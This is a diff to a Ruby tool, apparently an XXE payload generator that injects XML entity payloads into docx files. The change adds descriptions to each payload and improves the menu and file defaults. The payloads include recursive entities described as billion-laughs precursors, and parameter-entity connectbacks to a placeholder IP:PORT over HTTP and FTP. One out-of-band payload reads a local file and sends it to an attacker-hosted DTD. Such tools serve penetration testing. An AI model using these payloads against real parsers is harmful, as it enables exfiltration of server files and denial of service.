@@ -15,15 +15,15 @@ require 'fileutils'
 # Keep the payloads organized
 def read_payloads()	
 	pl = {}
-	pl["vanilla_entity"] = '<!DOCTYPE root [<!ENTITY xxe "XE_SUCCESSFUL">]>'
-	pl["vanilla_recursive"] = '<!DOCTYPE root [<!ENTITY b "XE_SUCCESSFUL"><!ENTITY xxe "RECURSE &b;&b;&b;&b;">]>'	
-	pl["vanilla_parameter"] = '<!DOCTYPE root [<!ENTITY % xxe "test"> %xxe;]>>'
-	pl["vanilla_parameter_recursive"] = '<!DOCTYPE root [<!ENTITY % a "PARAMETER"> <!ENTITY % b "RECURSIVE %a;"> %b;]>>'
-	pl["parameter_connectback"] = '<!DOCTYPE root [<!ENTITY % a SYSTEM "http://IP:PORT/b.dtd">%a;]>>'
-	pl["dbl_parameter_connectback"] = '<!DOCTYPE roota [<!ENTITY % file SYSTEM "http://IP:PORT/a.html"><!ENTITY % a SYSTEM "http://IP:PORT/b.dtd">%a;]>>'
-	pl["rc_parameter_connectback"] = '<!DOCTYPE roota [<!ENTITY % file SYSTEM "http://IP:PORT/a.html"><!ENTITY % a SYSTEM "http://IP:PORT/b.dtd">%a;]>>'
-	pl["parameter_connectback_ftp"] = '<!DOCTYPE root [<!ENTITY % a SYSTEM "ftp://IP:PORT/b.dtd">%a;]>>'
-	pl["xinclude_root"] = '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///IP:PORT/clown.html" parse="text"/></root>'
+	pl["vanilla_entity"] = ['<!DOCTYPE root [<!ENTITY xxe "XE_SUCCESSFUL">]>', "A simple XML entity."]
+	pl["vanilla_recursive"] = ['<!DOCTYPE root [<!ENTITY b "XE_SUCCESSFUL"><!ENTITY xxe "RECURSE &b;&b;&b;&b;">]>', "A recursive XML entity, precursor to billion laughs attack."]	
+	pl["vanilla_parameter"] = ['<!DOCTYPE root [<!ENTITY % xxe "test"> %xxe;]>>', "A simple parameter entity. This is useful to test if parameter entities are filtered."]
+	pl["vanilla_parameter_recursive"] = ['<!DOCTYPE root [<!ENTITY % a "PARAMETER"> <!ENTITY % b "RECURSIVE %a;"> %b;]>>', "Recursive parameter entity, precusor to parameter entity billion laughs"]
+	pl["parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "http://IP:PORT/b.dtd">%a;]>>', "Parameter Entity Connectback, the simplest connect back test."]
+	pl["dbl_parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "http://IP:PORT/a.html"><!ENTITY % a SYSTEM "http://IP:PORT/b.dtd">%a;]>>',"This implements an effective OOB technique. It needs to be paired with a vaid DTD on the server."]
+	pl["rc_parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "file://FILE"><!ENTITY % a SYSTEM "http://IP:PORT/b.dtd">%a;]>>',"The same OOB technique but retrieves a file. Again needs to be paired with a valid DTD on the server."]
+	pl["parameter_connectback_ftp"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "ftp://IP:PORT/b.dtd">%a;]>>',"FTP connectback test."]
+	pl["xinclude_root"] = ['<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///IP:PORT/clown.html" parse="text"/></root>', "XInclude test"]
 
 	return pl
 end
@@ -50,12 +50,14 @@ def select_payload
 	choose do |menu|
 		menu.prompt = "Choose XXE payload:"	
 		ploads.each do |pload|
-			menu.choice pload[0] do payload = pload end
+			menu.choice pload[0] do payload = pload[1][0] end
 		end
 		menu.choice "Print XXE Payload Values" do 
+			i = 0
 			ploads.each do |pload|
-				p pload
-			end
+				i = i +1
+				puts "#{i}. #{pload[1][1]} \n\t #{pload[1][0]}"				
+			end			
 			main
 			exit
 		end
@@ -136,12 +138,15 @@ end
 # The string replacement functionality, it's painfully hardcoded right now
 def find_string
 	if(@input_file.size > 0)
+		# TODO check if this exists
 		puts "|+| Using #{@input_file}"
 	else
-		docx = ask("Please Enter Input File ('Q' to go back):")
+		docx = ask("Please Enter Input File (Defaults to samples/sample.docx):")
 		if docx.downcase == "Q"
 			return
 		else
+			docx = "./samples/sample.docx" unless docx
+			
 			# check if file exists
 			if File.file?(docx)		
 				puts "|+| #{docx} Loaded"
@@ -205,20 +210,22 @@ end
 # Allow the user to specify their input file
 def list_files_menu
 	if(@input_file.size > 0)
+		# TODO check if this exists
 		puts "|+| Using #{@input_file}"
 		choose_file(@input_file)
 	else
-		docx = ask("Please Enter Input File ('Q' to go back):")
+		docx = ask("Please Enter Input File (Defaults to samples/sample.docx):")
 		if docx.downcase == "Q"
 			return
 		else
 			docx = @input_file.size == 0 ? docx : @input_file
+			docx = docx.size == 0 ? "./samples/sample.docx" : docx
 			@input_file = docx
 			
 			# check if file exists
 			if File.file?(docx)		
+				puts "|+| #{docx} Loaded\n"
 				choose_file(docx)
-				puts "|+| #{docx} Loaded"
 			else
 				puts "|!| #{docx} cannot be found."
 			end
